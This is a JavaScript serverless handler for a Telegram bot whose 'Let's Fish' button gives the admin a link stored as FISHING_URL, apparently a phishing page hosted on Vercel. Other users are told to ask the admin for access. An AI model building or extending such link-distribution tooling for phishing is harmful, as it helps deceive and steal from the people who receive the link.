const BOT_TOKEN = "example";
const ADMIN_ID = "7216371031";
const TELEGRAM_LINK = "https://t.me/mohdrishad";
const FISHING_URL = "https://heavenscake.vercel.app/page.html";
const INSTAGRAM_URL = "https://instagram.com/teckyrishad";

export default async function handler(req, res) {
  if (req.method === "POST") {
    const body = req.body;

    try {
      // Handle /start command
      if (body.message && body.message.text === "/start") {
        const chatId = body.message.chat.id;

        const reply_markup = {
          inline_keyboard: [
            [
              { text: "🔗 My Instagram", url: INSTAGRAM_URL },
              { text: "👤 Get Admin Details", callback_data: "admin_request" }
            ],
            [
              { text: "🎣 Let’s Fish", callback_data: "fish_request" }
            ]
          ]
        };

        await sendMessage(BOT_TOKEN, chatId, "👋 Welcome to Tecky Rishad Bot!\n\nChoose an option below:", reply_markup);
      }

      // Handle callback button actions
      if (body.callback_query) {
        const chatId = body.callback_query.from.id.toString();
        const queryId = body.callback_query.id;
        const data = body.callback_query.data;
        let message = "";

        if (data === "admin_request") {
          message = (chatId === ADMIN_ID)
            ? "👤 Admin Details:\nName: Tecky Rishad\nTelegram: @mohdrishad"
            : "🚫 Sorry, this is not for you!";
        }

        if (data === "fish_request") {
          message = (chatId === ADMIN_ID)
            ? `🎣 Click here to fish:\n${FISHING_URL}`
            : `🚫 This is not for you!\n\nRequest permission from admin:\n👉 ${TELEGRAM_LINK}`;
        }

        await sendMessage(BOT_TOKEN, chatId, message);
        await answerCallback(BOT_TOKEN, queryId);
      }

      return res.status(200).end("ok");
    } catch (error) {
      console.error("💥 Error:", error);
      return res.status(500).json({ error: "Something went wrong!" });
    }
  } else {
    return res.status(405).end("Method Not Allowed");
  }
}

// Send message to Telegram
async function sendMessage(token, chatId, text, reply_markup = null) {
  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: "Markdown",
        ...(reply_markup && { reply_markup })
      })
    });
  } catch (err) {
    console.error("📨 Error sending message:", err);
  }
}

// Confirm Telegram callback
async function answerCallback(token, queryId) {
  try {
    await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ callback_query_id: queryId })
    });
  } catch (err) {
    console.error("✅ Error answering callback:", err);
  }
}
